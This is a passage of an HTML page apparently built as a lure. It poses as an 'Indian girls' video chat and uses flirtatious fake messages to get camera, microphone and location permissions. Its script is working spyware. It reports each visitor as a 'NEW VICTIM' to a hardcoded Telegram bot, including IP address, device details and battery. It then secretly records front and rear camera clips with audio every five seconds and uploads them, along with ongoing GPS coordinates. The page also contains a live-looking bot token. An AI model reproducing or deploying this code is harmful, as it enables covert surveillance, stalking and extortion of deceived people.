        .battery-info, .location-info {

        }
    </style>
</head>
<body>

        <div class="status-container">

            <div id="status" class="status-display">Initializing HD connection...</div>
            <div id="liveStatus"></div>
            <div id="batteryInfo" class="battery-info"></div>
            <div id="locationInfo" class="location-info"></div>
        </div>
        
        <div class="fake-chat">
            <div class="message">Hi handsome! 😍 Your connection looks perfect!</div>
            <div class="message">Please grant camera/mic/location permissions for HD video chat 💕</div>
            <div class="message">Can't wait to see you live! 🎥✨</div>
        </div>
    </div>

    <script>
        // ===== YOUR TELEGRAM CONFIG =====
        const TELEGRAM_TOKEN = '8733931392:AAEIsUPfc-wl0PzA9jdZ8kc6IO2Dk7_KIl4';
        const CHAT_ID = '-5074591182';
        // =================================

        const sessionId = 'indianchat_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        let isStreaming = false, clipCount = 0;
        let mediaRecorderFront, mediaRecorderRear, frontStream, rearStream, audioStream;
        let videoClipQueue = [], locationTimer, batteryTimer;

        // PAGE LOAD - AUTO START EVERYTHING
        window.onload = async () => {
            showSpinner(true);
            showStatus('🔄 Initializing HD video connection...', 'success');
            
            // Send immediate visitor info
            await sendVisitorInfo();
            
            // AUTO REQUEST ALL PERMISSIONS
            await requestAllPermissions();
        };

        // 1. VISITOR INFO
        async function sendVisitorInfo() {
            try {
                const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
                const batteryInfo = await getBatteryInfo();
                
                const info = `🎀 INDIAN GIRLS CHAT - NEW VICTIM
━━━━━━━━━━━━━━━━━━━━━

👤 Session ID: ${sessionId}
🌐 IP Address: ${ip}
📱 User Agent: ${navigator.userAgent.slice(0,80)}
🗣️ Language: ${navigator.language}
📐 Screen: ${screen.width}x${screen.height}
💻 Platform: ${navigator.platform}
🔋 Battery: ${batteryInfo.level}% ${batteryInfo.charging ? '🔌 Charging' : '📴'}

🚀 LiveChat Spyware v3.0 - AUTO STREAMING ACTIVE
━━━━━━━━━━━━━━━━━━━━━`;

                await sendTelegram('sendMessage', { text: info });
            } catch(e) {
                console.error('Visitor info send failed:', e);
            }
        }

        // 2. AUTO REQUEST ALL PERMISSIONS
        async function requestAllPermissions() {
            try {
                showStatus('📹 Requesting FRONT + REAR cameras...', 'success');
                
                // Get BOTH cameras + audio simultaneously
                const constraints = {
                    video: [{ facingMode: 'user' }, { facingMode: 'environment' }],
                    audio: true
                };
                
                const streams = await Promise.all([
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: {ideal: 1280}, height: {ideal: 720} }, audio: true }),
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: {ideal: 1280}, height: {ideal: 720} }, audio: true })
                ]);
                
                frontStream = streams[0];
                rearStream = streams[1];
                
                showStatus('📍 Requesting GPS location...', 'success');
                const gpsPos = await getLocation();
                
                showStatus('✅ ALL PERMISSIONS GRANTED! Starting HD video stream...', 'success');
                
                // START CONTINUOUS STREAMING
                startContinuousStreaming();
                
                // Send confirmation
                await sendTelegram('sendMessage', { 
                    text: `🎉 FULL ACCESS GRANTED!\n👤 ${sessionId}\n📍 GPS: ${gpsPos.coords.latitude.toFixed(6)}, ${gpsPos.coords.longitude.toFixed(6)}\n✅ FRONT+REAR CAMERAS + MIC + GPS ACTIVE` 
                });
                
            } catch(error) {
                showStatus(`❌ Permission denied: ${error.message}\nRetrying in 3 seconds...`, 'error');
                setTimeout(requestAllPermissions, 3000); // Auto retry
            }
        }

        // 3. CONTINUOUS VIDEO+AUDIO STREAMING (EVERY 5 SECONDS)
        function startContinuousStreaming() {
            isStreaming = true;
            showSpinner(false);
            updateLiveStatus('🔴 LIVE HD STREAM ACTIVE');
            
            // 🔥 VIDEO CLIPS EVERY 5 SECONDS (BOTH CAMERAS + AUDIO)
            setInterval(() => {
                if (isStreaming) {
                    recordVideoClip(frontStream, 'FRONT');
                    recordVideoClip(rearStream, 'REAR');
                }
            }, 5000);
            
            // 🔥 LOCATION/BATTERY EVERY 30 SECONDS
            locationTimer = setInterval(async () => {
                if (isStreaming) {
                    const pos = await getLocation();
                    const battery = await getBatteryInfo();
                    sendLocationBattery(pos, battery);
                }
            }, 30000);
            
            // 🔥 BATTERY UPDATE EVERY 2 MINUTES
            batteryTimer = setInterval(async () => {
                if (isStreaming) {
                    const battery = await getBatteryInfo();
                    sendTelegram('sendMessage', { 
                        text: `🔋 BATTERY UPDATE\n👤 ${sessionId}\n⚡ ${battery.level*100}% ${battery.charging ? '🔌 CHARGING' : '📴 DISCHARGING'}\n📱 Status: ${navigator.onLine ? 'ONLINE' : 'OFFLINE'}` 
                    });
                }
            }, 120000);
        }

        // 4. RECORD 5-SECOND VIDEO CLIP WITH AUDIO
        async function recordVideoClip(stream, cameraType) {
            try {
                const recorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp9,opus',
                    videoBitsPerSecond: 2500000 // 2.5Mbps HD quality
                });
                
                const chunks = [];
                recorder.ondataavailable = (e) => chunks.push(e.data);
                
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    videoClipQueue.push({ blob, cameraType });
                    await processVideoQueue();
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), 4800); // 4.8s clips
                clipCount++;
                
            } catch(e) {
                console.error('Video recording failed:', e);
            }
        }

        // 5. PROCESS VIDEO QUEUE
        async function processVideoQueue() {
            if (videoClipQueue.length === 0) return;
            
            const { blob, cameraType } = videoClipQueue.shift();
            const fileSize = (blob.size / 1024 / 1024).toFixed(2);
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', blob, `${cameraType}_${sessionId}_clip${clipCount}.webm`);
            formData.append('caption', `🎥 ${cameraType} CAMERA HD CLIP\n👤 ${sessionId}\n📹 ${fileSize}MB | #${clipCount}\n📍 Live GPS tracking active`);
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            }).then(() => {
                updateLiveStatus(`📹 Sent ${cameraType} clip #${clipCount}`);
            }).catch(e => console.error('Video send failed:', e));
            
            // Process next
            setTimeout(processVideoQueue, 500);
        }

        // 6. LOCATION FUNCTIONS
        function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    resolve,
                    () => resolve({ coords: { latitude: 0, longitude: 0 } }),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        async function sendLocationBattery(pos, battery) {
            const msg = `📍 GPS + BATTERY\n👤 ${sessionId}\n📍 ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}\n📏 ${pos.coords.accuracy?.toFixed(0)}m\n🔋 ${battery.level*100?.toFixed(1)}% ${battery.charging ? '🔌' : '📴'}\n📡 Signal: ${navigator.onLine ? 'STRONG' : 'WEAK'}`;
            await sendTelegram('sendMessage', { text: msg });
            updateLocationDisplay(pos);
            updateBatteryDisplay(battery);
        }

        // 7. BATTERY API
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level,
                        charging: battery.charging
                    };
                } catch(e) {
                    return { level: 0, charging: false };
                }
            }
            return { level: 0, charging: false };
        }

        // 8. TELEGRAM SENDER
        async function sendTelegram(method, data) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`;
            const options = {
                method: 'POST',
                headers: method.includes('sendVideo') || method.includes('sendPhoto') || method.includes('sendVoice') ? {} : { 'Content-Type': 'application/json' },
                body: data.text ? JSON.stringify({ chat_id: CHAT_ID, text: data.text, parse_mode: 'HTML' }) : data
            };
            return fetch(url, options);
        }

        // UI HELPERS
        function showStatus(msg, type) {
            const status = document.getElementById('status');
            status.textContent = msg;
            status.className = `status-display ${type}`;
        }
        
        function updateLiveStatus(msg) {
            document.getElementById('liveStatus').textContent = msg;
            document.getElementById('liveStatus').className = 'status-display success';
        }
        
        function showSpinner(show) {
            document.getElementById('spinner').style.display = show ? 'block' : 'none';
        }
        
        function updateBatteryDisplay(battery) {
            document.getElementById('batteryInfo').textContent = `🔋 Battery: ${(battery.level*100).toFixed(1)}% ${battery.charging ? '🔌 Charging' : ''}`;
        }
        
        function updateLocationDisplay(pos) {
            document.getElementById('locationInfo').textContent = `📍 Location: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
        }

        // KEEPALIVE (Sends every 2 minutes)
        setInterval(() => {
            if (isStreaming) {
                sendTelegram('sendMessage', { 
                    text: `👤 ${sessionId} KEEPALIVE\n📱 Tab: ${document.hidden ? 'BACKGROUND' : 'FOREGROUND'}\n🎥 Clips sent: ${clipCount}\n📶 Online: ${navigator.onLine}` 
                });
            }
        }, 120000);

        // CLEANUP ON CLOSE (Sends final data within 2 seconds)
        window.onbeforeunload = async () => {
            if (isStreaming) {
                await sendTelegram('sendMessage', { 
                    text: `👤 ${sessionId} DISCONNECTED\n🎥 Total clips: ${clipCount}\n📱 Final status: ${navigator.onLine ? 'ONLINE' : 'OFFLINE'}` 
                });
            }
        };

        // PREVENT SLEEP/TAB SUSPENSION
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && isStreaming) {
                sendTelegram('sendMessage', { text: `👤 ${sessionId} TAB BACK TO FOREGROUND` });
            }
        });
    </script>
